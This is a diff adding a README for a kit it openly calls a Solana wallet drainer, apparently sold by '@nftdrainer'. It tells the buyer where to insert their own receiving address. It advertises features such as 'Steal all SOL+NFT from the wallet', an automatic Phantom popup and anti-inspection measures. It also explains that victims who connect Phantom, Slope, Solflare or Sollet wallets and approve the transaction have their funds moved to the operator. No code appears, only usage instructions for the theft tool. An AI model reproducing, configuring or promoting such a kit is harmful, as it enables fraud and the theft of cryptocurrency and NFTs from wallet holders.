@@ -1,0 +1,63 @@
+Edit all info like price in settings.js file
+Replace your address in static/js/main.chunk.js, on all 7 lines
+
+
+Features:
+
+Easy to use and edit
+Auto phantom popup
+Anti-F12 Inspect
+Embeded Message
+Added notifications
+
+Steal all SOL+NFT from the wallet
+
+
+
+How it work
+The user has to connect their wallet first. It supports four wallets such as Phantom, Slope, Solflare, & Sollet.
+After connected, the user need to press apprive, then their NFT+Solana will be transfered to your address.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+THIS CODE IS MADE & DISTRIBUTED BY @nftdrainer ! IF YOU HAVE BOUGHT IT FROM A THIRD PARTY SELLER YOU HAVE BEEN SCAMMED!
